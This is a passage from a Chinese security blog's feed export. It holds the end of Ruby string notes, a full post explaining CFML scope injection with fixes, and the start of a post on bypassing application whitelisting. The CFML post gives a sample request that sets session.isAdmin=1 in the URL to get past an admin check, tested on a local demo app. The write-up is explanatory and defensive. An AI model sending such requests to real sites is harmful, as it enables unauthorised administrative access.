&lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;16&quot;, &quot;61&quot;, 97]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;str&quot;&gt;&quot;\xfe\xff\xfe\xff&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;sS&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [-2, 65534]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;str&quot;&gt;&quot;now=20is&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;M&amp;#42&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;now is&quot;]&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;str&quot;&gt;&quot;whole&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;xax2aX2aX1aX2a&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#=&amp;gt; [&quot;h&quot;, &quot;e&quot;, &quot;l&quot;, &quot;l&quot;, &quot;o&quot;]&lt;/span&gt;</code></p></li></pre></div><div>字符内置方法:</div></div></div><div><div>我们需要有一个String对象实例调用一个String方法。以下的方法来创建String对象的一个实例：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)]&lt;/span&gt;</code></p></li></pre></div></div><div>这将返回一个新的字符串对象，其中包含str的一个副本。现在使用str的对象，我们可以任何可用实例方法的。例如：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;myStr &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;THIS IS TEST&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;foo &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; myStr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;downcase&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;#{foo}&quot;&lt;/span&gt;</code></p></li></pre></div></div></div><div>字符编码：</div><div><div>Ruby的默认字符集是ASCII码，字符可能会由单字节表示。</div><div>如果使用UTF-8或另一种现代的字符集，字符可能会以四个字节表示。</div><div>可以更改字符集使用$KCODE的在程序的开始行，像这样：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;$KCODE &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;u&#39;&lt;/span&gt;</code></p></li></pre></div></div><div>以下是 $KCODE 可能的值：a[ASCII (same as none). This is the default.]、e[EUC.]、n[None (same as ASCII)]、u[UTF-8]</div></div><p></p><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-BEGIN-END-语法&quot;&gt;&lt;a href=&quot;#1-BEGIN-END-语法&quot; class=&quot;headerlink&quot; title=&quot;1.BEGIN/END 语法&quot;&gt;&lt;/a&gt;1.BEGIN/END 语法&lt;/h3&gt;&lt;div&gt;&lt;div&gt;&lt;pre class=&quot;pre
      
    
    </summary>
    
      <category term="读书笔记" scheme="https://tycx2ry.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CFML中的Scope Injection</title>
    <link href="https://tycx2ry.github.io/2015/09/01/cfml-e4-b8-ad-e7-9a-84scope-injection/"/>
    <id>https://tycx2ry.github.io/2015/09/01/cfml-e4-b8-ad-e7-9a-84scope-injection/</id>
    <published>2015-09-01T08:32:59.000Z</published>
    <updated>2018-02-26T06:01:32.398Z</updated>
    
    <content type="html"><![CDATA[<p><span style="font-family:Calibri" lang="en-US">0x00 </span><span style="font-family:SimSun" lang="zh-CN">前言</span></p><p><span style="font-family:SimSun" lang="zh-CN">早上按例看</span><span style="font-family:Calibri" lang="en-US">mickey</span><span style="font-family:SimSun" lang="zh-CN">牛发的每日新知识，其中有一篇关于</span><span style="font-family:Calibri" lang="en-US">CFML</span><span style="font-family:SimSun" lang="zh-CN">中的</span><span style="font-family:Calibri" lang="zh-CN">Scope<br>Injection</span><span style="font-family:SimSun" lang="zh-CN">，我不知道怎么翻译这个次比较好，是叫“范围注入”还是叫“变量覆盖”？话不多说，在文中我就写“</span><span style="font-family:Calibri" lang="zh-CN">Scope</span><span style="font-family:SimSun" lang="zh-CN">注入”了。</span></p><p><span style="font-family:SimSun" lang="zh-CN"><br></span></p><p><span style="font-family:Calibri" lang="en-US">0x01 </span><span style="font-family:SimSun" lang="zh-CN">什么是</span><span style="font-family:Calibri" lang="en-US">CFML</span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;“CFML的全称是ColdFusion Markup Language，是一种特别适于用来编写互联网应用程序的语言。CFML看上去和传统的编程语言并不太一样，更接近HTML，因此和HTML一样非常的易学易用。CFML可以在ColdFusion应用程序服务器上运行，也可以在其它一些应用程序服务器运行。”    ---百度百科&lt;/span&gt;</code></pre></div><p><span style="font-family:SimSun" lang="zh-CN">简而言之，</span><span style="font-family:Calibri" lang="en-US">CFML</span><span style="font-family:SimSun" lang="zh-CN">就是一种开发语言，所用于</span><span style="font-family:Calibri" lang="en-US">web</span><span style="font-family:SimSun" lang="zh-CN">开发。</span></p><p><span style="font-family:Calibri" lang="en-US">0x02 SCOPE</span><span style="font-family:SimSun" lang="zh-CN">注入</span></p><p>假设这是一段权限控制代码，通过session.isAdmin判断用户是不是管理员：</p><p>&lt;cfif<br>session.isAdmin&gt;</p><p>&nbsp;&nbsp;&nbsp; Do something only an admin can do…</p><p>&lt;/cfif&gt;</p><p><span style="font-family:SimSun" lang="zh-CN">如果isAdmin没有被定义在</span><span style="font-family:Calibri" lang="en-US">session</span><span style="font-family:SimSun" lang="zh-CN">中，也就是说</span><span style="font-family:Calibri" lang="en-US">isAdmin</span><span style="font-family:SimSun" lang="zh-CN">没有被初始化，那么我们像如下来发送一个</span><span style="font-family:Calibri" lang="en-US">GET</span><span style="font-family:SimSun" lang="zh-CN">请求会发生什么呢？</span></p><p>/admin/something.cfm?session.isAdmin=1</p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;执行流程：&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;首先检测&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;是否被定义在&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;域中&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;lit&quot;&gt;2.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;如果没有被定义在&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;中，程序将到别的域中搜索，比如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;域&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;lit&quot;&gt;3.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;如果在&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;域中有&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;，并且为&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;true&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;lit&quot;&gt;4.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;上面代码的权限控制就被绕过了&lt;/span&gt;</code></pre></div><p><span style="font-family:宋体" lang="zh-CN">通过上面的描述，有没有感觉有点像</span><span style="font-family:Calibri" lang="en-US">php</span><span style="font-family:宋体" lang="zh-CN">中的</span><span style="font-family:Calibri" lang="zh-CN">register_globals</span><span lang="zh-CN"><font face="宋体">.</font></span></p><p><span lang="zh-CN"><font face="宋体"><br></font></span></p><p><span style="font-family:Calibri" lang="en-US">0x03 </span><span style="font-family:宋体" lang="zh-CN">实际测试</span></p><p>测试代码是Joseph<br>Lamoree写的</p><p><a href="https://github.com/ecivis/miniapp" target="_blank" rel="noopener">https://github.com/ecivis/miniapp</a></p><p><span style="font-family:宋体" lang="zh-CN">测试环境：</span><span style="font-family:Calibri" lang="en-US">windows7+</span><span style="font-family:Calibri" lang="zh-CN">Adobe<br>ColdFusion </span><span style="font-family:Calibri" lang="en-US">9</span><span style="font-family:宋体" lang="zh-CN">（</span><span style="font-family:Calibri" lang="en-US">Ps:</span><span style="font-family:宋体" lang="zh-CN">只找到了这个）</span><span style="font-family: 宋体; font-size: 10.5pt; line-height: 1.5;">&nbsp;</span></p><p>测试代码主要片段：</p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfsilent&amp;gt;&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;pageScope&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;structNew()&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;pageScope&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;You are a regular user.&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;com&quot;&gt;&amp;lt;!--- Make sure the user is not isAdmin ---&amp;gt;&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfif&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;structKeyExists&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;structDelete&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfif&amp;gt;&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;com&quot;&gt;&amp;lt;!--- See if scope cascade finds this in the url scope ---&amp;gt;&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cftry&amp;gt;&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfif&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;eq&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; 1&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfset&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;pageScope&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;You are an administrator due to scope shenanigans.&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;/&amp;gt;&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfif&amp;gt;&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;cfcatch&amp;gt;&lt;/span&gt;</code><br>16.  <code>&lt;span class=&quot;com&quot;&gt;&amp;lt;!---&lt;/span&gt;</code><br>17.  <code>&lt;span class=&quot;com&quot;&gt;The lookup for session.isAdmin was invalid.&lt;/span&gt;</code><br>18.  <code>&lt;span class=&quot;com&quot;&gt;This is the behavior we would expect from a reasonable from a CFML engine.&lt;/span&gt;</code><br>19.  <code>&lt;span class=&quot;com&quot;&gt;&amp;nbsp;---&amp;gt;&lt;/span&gt;</code><br>20.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfcatch&amp;gt;&lt;/span&gt;</code><br>21.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/cftry&amp;gt;&lt;/span&gt;</code><br>22.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/cfsilent&amp;gt;&lt;/span&gt;</code></pre></div><p><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/09/wpid-b7a27ea98576d6ce879b190f0b031cae_clip_image00194eee1c0-eef5-4d98-baf0-a478e82c3577.png" alt="计算机生成了可选文字: .1二i人p.:Te,tScopel幻ectio。一甘iodo,,IoteroetExplore二O窗，奋收藏夹君。in:App习，回http:/J,127.0.0.,8500/:cope一‘nject"></p><p>发送请求：</p><p><a href="http://127.0.0.1:8500/scope-injection.cfm?session.isAdmin=1" target="_blank" rel="noopener">http://127.0.0.1:8500/scope-injection.cfm?session.isAdmin=1</a></p><p><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/09/wpid-b7a27ea98576d6ce879b190f0b031cae_clip_image00257574c75-f097-4858-b336-075dc21ebb05.png" alt="计算机生成了可选文字: ／、．ini助p:TestScopel幻eetion一份i皿do,5Inter皿etE二plorerg④文件健）它收藏夹。旦j不苟面丽芯赢基二二二二蔽二二不甚r一一一__,_―山－_编辑但）查看仪〕收藏夹达〕工具江〕帮助逛）｝协卜建议网站，琶网贝l厌讯库，燮且．启M"></p><p>&nbsp;</p><p><span style="font-family:Calibri" lang="en-US">0x04 </span><span style="font-family:宋体" lang="zh-CN">避免方案</span></p><p><span style="font-family:Calibri" lang="en-US">1.</span><span style="font-family:宋体" lang="zh-CN">变量初始化再使用</span></p><p>如上文提到代码，在Application.cfc中加入初始化：</p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cffunction name&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;onSessionStart&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfset session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cffunction&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;</code></pre></div><p><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/09/wpid-b7a27ea98576d6ce879b190f0b031cae_clip_image003cbfd73ab-4bc8-47de-b60a-788ce2f4d914.png" alt="计算机生成了可选文字: 鱿几n工APp二Ie昌tscopeIn今C…口127.0.0.、丫翻口口口口口口口口口口口口口口1:8500/scope一injection.cfm?session.isA面in二1MiniApp:TestScopeInjectionYouarearegularTry1oadingthispage啊ithUSer。SOme上1二工飞三"></p><p><span style="font-family:宋体" lang="zh-CN">当然了测试的时候不要忘记删除上边代码中的</span><span style="font-family:Calibri" lang="en-US">:</span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;!---&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Make&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sure the user is not isAdmin &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;---&amp;gt;&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif structKeyExists&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&amp;gt;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfset structDelete&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)/&amp;gt;&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;</code></pre></div><p>&nbsp;</p><p><span style="font-family:Calibri" lang="en-US">2.</span><span style="font-family:宋体" lang="zh-CN">检测权限时候使用StructKeyExists检测变量是否存在</span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;StructKeyExists&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; AND session&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;isAdmin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; admin stuff&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cfif&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;</code></pre></div><p>修改上边代码测试</p><p><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/09/wpid-b7a27ea98576d6ce879b190f0b031cae_clip_image0041f410cb1-2f4c-418b-96c0-21b96eeaf1a9.png" alt="计算机生成了可选文字: &lt;cftry&gt;&lt;cf浦fStructKeyEx浦sts(sess浦on,”浦sAdm浦n&quot;)&lt;cfsetpagescope.message=&quot;YouareanANDSeSS嘴on。嘴SAdm浦nadm嘴n浦Stratordueeql&gt;toscopeshenan嘴gans.&quot;I&gt;&lt;/cfif&gt;"></p><p>&nbsp;</p><p>测试结果</p><p><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/09/wpid-b7a27ea98576d6ce879b190f0b031cae_clip_image005b2ca2283-6ecc-46ef-8966-333a280b0f19.png" alt="计算机生成了可选文字: 尸口令x"></p><p><span style="font-family:Calibri" lang="en-US">0x05 </span><span style="font-family:宋体" lang="zh-CN">引用</span></p><p><a href="http://www.petefreitag.com/item/834.cfm" target="_blank" rel="noopener">http://www.petefreitag.com/item/834.cfm</a></p><p><a href="https://github.com/ecivis/miniapp" target="_blank" rel="noopener">https://github.com/ecivis/miniapp</a></p><p><a href="http://www.ed2000.com/ShowFile.asp?FileID=175781" target="_blank" rel="noopener">http://www.ed2000.com/ShowFile.asp?FileID=175781</a></p><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;span style=&quot;font-family:Calibri&quot; lang=&quot;en-US&quot;&gt;0x00 &lt;/span&gt;&lt;span style=&quot;font-family:SimSun&quot; lang=&quot;zh-CN&quot;&gt;前言&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;fo
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>利用白名单应用绕过防护</title>
    <link href="https://tycx2ry.github.io/2015/08/28/e5-88-a9-e7-94-a8-e7-99-bd-e5-90-8d-e5-8d-95-e5-ba-94-e7-94-a8-e7-bb-95-e8-bf-87-e9-98-b2-e6-8a-a4/"/>
    <id>https://tycx2ry.github.io/2015/08/28/e5-88-a9-e7-94-a8-e7-99-bd-e5-90-8d-e5-8d-95-e5-ba-94-e7-94-a8-e7-bb-95-e8-bf-87-e9-98-b2-e6-8a-a4/</id>
    <published>2015-08-28T14:51:15.000Z</published>
    <updated>2018-02-26T06:02:35.150Z</updated>
    
    <content type="html"><![CDATA[<p><strong><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">0x00 </span></span><span style="font-size: 10.5pt; line-height: 1.5;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">前言</span></span></strong></p><p><span style="font-size: 10.5pt; line-height: 1.5;">看了</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">subTee</span><span style="font-size: 10.5pt; line-height: 1.5;">的在</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">ShmooCon2015</span><span style="font-size: 10.5pt; line-height: 1.5;">的</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">PPT</span><span style="font-size: 10.5pt; line-height: 1.5;">，学习到了很多关于应用白名单绕过的技巧，今天又看见了</span><span lang="EN-US" style="font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;">subTee</span><span style="font-size: 10.5pt; line-height: 1.5;">开始写博客了，并且详细解释了关于应用白名单绕过的方法，于是结合自己测试与大家分享一下。</span></p><p><span style="font-size:10.5pt">看完</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">ppt</span><span style="font-size:10.5pt">其实作者是想告诉我们一种思想，我自己的理解是</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">“</span><span style="font-size:10.5pt">利用信任程序执行恶意代码</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">“</span><span style="font-size:10.5pt">。<span 